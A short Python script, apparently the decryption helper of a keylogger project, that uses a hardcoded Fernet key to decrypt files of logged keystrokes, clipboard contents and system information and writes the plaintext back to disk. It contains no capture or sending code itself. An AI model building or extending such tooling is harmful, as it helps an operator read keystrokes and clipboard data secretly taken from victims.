from cryptography.fernet import Fernet

key = "kNYK5uYa8aux5699sCcMecqqrv6Mr0Zm5lMsFkShtL0="

logged_keystrokes_encrypted = "logged_keystrokes_encrypted.txt"
system_information_encrypted = "system_information_encrypted.txt"
clipboard_information_encrypted = "clipboard_information_encrypted.txt"

encryptedFiles = [logged_keystrokes_encrypted, system_information_encrypted, clipboard_information_encrypted]
count = 0

for file in encryptedFiles:
    with open(file, "rb")as f:
        data = f.read()
    
    fernet = Fernet(key)
    decryptedData = fernet.decrypt(data)

    with open(encryptedFiles[count], "wb") as f:
        f.write(decryptedData)

    count += 1